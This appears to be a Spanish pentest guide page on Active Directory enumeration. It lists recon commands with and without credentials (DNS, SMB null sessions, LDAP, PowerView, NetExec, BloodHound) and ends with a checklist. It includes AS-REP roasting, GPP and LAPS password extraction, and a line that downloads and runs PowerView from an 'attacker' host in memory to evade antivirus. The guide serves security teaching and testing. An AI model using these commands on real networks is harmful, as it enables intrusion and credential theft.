---
icon: windows
---

# Enumeración

La enumeración es la fase más importante en un pentest de AD. Cuanta más información se recopile, más rutas de ataque se descubren. Se divide en dos fases: sin credenciales (desde fuera o con acceso de red) y con credenciales (con una cuenta de dominio, aunque sea de bajo privilegio).

### Enumeración sin credenciales

#### DNS — Descubrir el dominio

```bash
# Descubrir el DC por DNS
nmap -p 53 --script dns-srv-enum --script-args dns-srv-enum.domain=empresa.local 10.10.10.0/24

# Query SRV records del dominio
nslookup -type=SRV _ldap._tcp.empresa.local
nslookup -type=SRV _kerberos._tcp.empresa.local
nslookup -type=SRV _kpasswd._tcp.empresa.local

# Dig equivalente
dig SRV _ldap._tcp.empresa.local
dig SRV _kerberos._tcp.empresa.local @10.10.10.10

# Zone transfer (si está mal configurado)
dig axfr empresa.local @10.10.10.10
```

#### SMB — Null sessions y shares

```bash
# Enumerar con null session (sin credenciales)
smbclient -L //10.10.10.10 -N
smbclient //10.10.10.10/SYSVOL -N
smbclient //10.10.10.10/NETLOGON -N

# CrackMapExec / NetExec
nxc smb 10.10.10.10
nxc smb 10.10.10.0/24          # Descubrir hosts SMB en la red
nxc smb 10.10.10.10 --shares -u '' -p ''   # Null session

# Enum4linux (herramienta legacy pero útil)
enum4linux -a 10.10.10.10
enum4linux-ng -A 10.10.10.10   # Versión mejorada

# rpcclient con null session
rpcclient -U "" -N 10.10.10.10
rpcclient> enumdomusers         # Listar usuarios
rpcclient> enumdomgroups        # Listar grupos
rpcclient> querydominfo         # Info del dominio
rpcclient> getdompwinfo         # Política de contraseñas
```

#### LDAP — Consultas anónimas

```bash
# ldapsearch sin autenticación
ldapsearch -x -H ldap://10.10.10.10 -b "DC=empresa,DC=local"
ldapsearch -x -H ldap://10.10.10.10 -b "" -s base "(objectclass=*)"

# Usuarios con ldapsearch anónimo
ldapsearch -x -H ldap://10.10.10.10 -b "DC=empresa,DC=local" "(objectClass=user)" sAMAccountName

# Nmap LDAP scripts
nmap -p 389 --script ldap-rootdse 10.10.10.10
nmap -p 389 --script ldap-search 10.10.10.10
```

#### AS-REP — Usuarios sin preautenticación Kerberos (sin creds)

```bash
# Kerbrute — enumerar usuarios válidos por Kerberos
kerbrute userenum -d empresa.local --dc 10.10.10.10 /usr/share/wordlists/usernames.txt

# Impacket — AS-REP Roasting sin credenciales (usuarios conocidos)
impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt
```

### Enumeración con credenciales

Con cualquier cuenta de dominio (aunque sea sin privilegios) se puede enumerar casi todo el AD.

#### PowerView (PowerShell — desde Windows)

```powershell
# Importar
Import-Module .\PowerView.ps1
# O en memoria (evade AV)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Info general del dominio
Get-Domain
Get-DomainController
Get-DomainPolicy
(Get-DomainPolicy)."system access"   # Política de contraseñas

# Usuarios
Get-DomainUser                                     # Todos los usuarios
Get-DomainUser -Identity admin                     # Usuario específico
Get-DomainUser -Properties samaccountname,memberof,description,pwdlastset,lastlogon
Get-DomainUser | Where-Object {$_.description -ne $null}   # Usuarios con descripción (a veces contiene credenciales)
Get-DomainUser -SPN                                # Usuarios con SPN (→ Kerberoasting)
Get-DomainUser -PreauthNotRequired                 # Usuarios sin preauth (→ AS-REP Roasting)

# Grupos
Get-DomainGroup                                    # Todos los grupos
Get-DomainGroup -Identity "Domain Admins"          # Grupo específico
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # Miembros recursivos
Get-DomainGroup | Where-Object {$_.membercount -gt 0}

# Equipos
Get-DomainComputer
Get-DomainComputer -Properties dnshostname,operatingsystem
Get-DomainComputer | Where-Object {$_.operatingsystem -like "*Server*"}

# OUs
Get-DomainOU
Get-DomainOU -Properties name,gplink

# GPOs
Get-DomainGPO
Get-DomainGPO -Identity "{GUID}"
Get-DomainGPOLocalGroup        # GPOs que modifican grupos locales

# Shares
Find-DomainShare                    # Todas las shares del dominio
Find-DomainShare -CheckShareAccess  # Solo las accesibles con las credenciales actuales

# Sesiones y logons activos (requiere admin en los equipos objetivo)
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName WS01
Find-DomainUserLocation -UserIdentity admin  # Dónde está logueado un usuario

# Trusts
Get-DomainTrust
Get-ForestTrust
```

#### ACLs con PowerView

```powershell
# ACLs sobre un objeto específico
Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs

# Buscar ACLs interesantes para un usuario
Get-DomainObjectACL -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq (Get-DomainUser usuario).objectsid
}

# ACLs abusables (GenericAll, WriteDACL, etc.)
Get-DomainObjectACL -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword"
} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Find-InterestingDomainAcl → busca ACLs no predeterminadas sobre objetos de alto valor
Find-InterestingDomainAcl -ResolveGUIDs
```

#### Impacket (desde Linux)

```bash
# Enumerar usuarios
impacket-GetADUsers -all empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# Enumerar SPNs (→ Kerberoasting)
impacket-GetUserSPNs empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# Obtener usuarios sin preauth (→ AS-REP Roasting)
impacket-GetNPUsers empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# Consultas LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "usuario@empresa.local" -w "contraseña" \
    -b "DC=empresa,DC=local" "(objectClass=user)" sAMAccountName memberOf description
```

#### NetExec / CrackMapExec (desde Linux)

```bash
# Usuarios del dominio
nxc smb 10.10.10.10 -u usuario -p contraseña --users

# Grupos
nxc smb 10.10.10.10 -u usuario -p contraseña --groups

# Equipos
nxc smb 10.10.10.10 -u usuario -p contraseña --computers

# Shares accesibles
nxc smb 10.10.10.10 -u usuario -p contraseña --shares

# Políticas de contraseña
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol

# Sesiones activas
nxc smb 10.10.10.10 -u usuario -p contraseña --sessions

# Loggeados actualmente
nxc smb 10.10.10.10 -u usuario -p contraseña --loggedon-users

# RDP activo
nxc rdp 10.10.10.0/24 -u usuario -p contraseña

# WinRM disponible
nxc winrm 10.10.10.0/24 -u usuario -p contraseña
```

#### BloodHound — Enumeración visual

```bash
# Recolectar datos con BloodHound.py (desde Linux)
bloodhound-python -u usuario -p contraseña -d empresa.local -ns 10.10.10.10 -c all

# Recolectar datos con SharpHound (desde Windows)
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup --stealth

# Importar en BloodHound
# Abrir BloodHound → Upload Data → seleccionar ZIP generado
```

Queries útiles en BloodHound:

```
Find all Domain Admins
Find Shortest Path to Domain Admins
Find Principals with DCSync Rights
Find Computers where Domain Users are Local Admin
Find AS-REP Roastable Users
Find Kerberoastable Users with most privileges
Shortest Paths from Kerberoastable Users
```

#### Enumerar SYSVOL y GPP

```bash
# Buscar contraseñas en SYSVOL (GPP passwords — CVE-2014-1812)
smbclient //10.10.10.10/SYSVOL -U "empresa.local\usuario%contraseña"
# Buscar manualmente: groups.xml, scheduledtasks.xml, services.xml

# Automático con netexec
nxc smb 10.10.10.10 -u usuario -p contraseña -M gpp_password

# Automático con impacket
impacket-Get-GPPPassword -xmlfile groups.xml

# Con PowerView
Get-GPPPassword

# Descifrar cpassword manualmente (AES-256, clave pública de Microsoft)
gpp-decrypt CPASSWORD_VALUE
```

#### Enumeración de LAPS

```bash
# Verificar si LAPS está instalado
nxc smb 10.10.10.10 -u usuario -p contraseña -M laps

# Leer contraseñas LAPS (si se tienen permisos)
nxc ldap 10.10.10.10 -u usuario -p contraseña -M laps

# Con PowerView
Get-DomainComputer -Properties dnshostname,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
    Where-Object {$_."ms-mcs-admpwd" -ne $null}
```

### Checklist

```
□ Identificar DC(s) y nombre del dominio
□ Enumerar todos los usuarios del dominio
□ Buscar usuarios con descripción que contenga credenciales
□ Buscar usuarios con SPN (Kerberoasting)
□ Buscar usuarios sin preautenticación Kerberos (AS-REP Roasting)
□ Enumerar grupos privilegiados y sus miembros
□ Enumerar equipos (OS, hostname, sesiones activas)
□ Enumerar shares y buscar archivos sensibles
□ Enumerar GPOs y sus permisos
□ Analizar ACLs con BloodHound
□ Buscar contraseñas en SYSVOL (GPP)
□ Verificar si LAPS está activo y si podemos leerlo
□ Enumerar trusts entre dominios
□ Identificar rutas de ataque en BloodHound
```

> Una cuenta de dominio sin privilegios es suficiente para enumerar casi todo AD via LDAP. La enumeración completa no requiere ser admin.

> Revisar siempre el campo description de los usuarios de AD — es sorprendentemente común encontrar contraseñas ahí dejadas por administradores.

> BloodHound + SharpHound/bloodhound-python es la herramienta más potente para encontrar rutas de ataque que serían imposibles de descubrir manualmente.
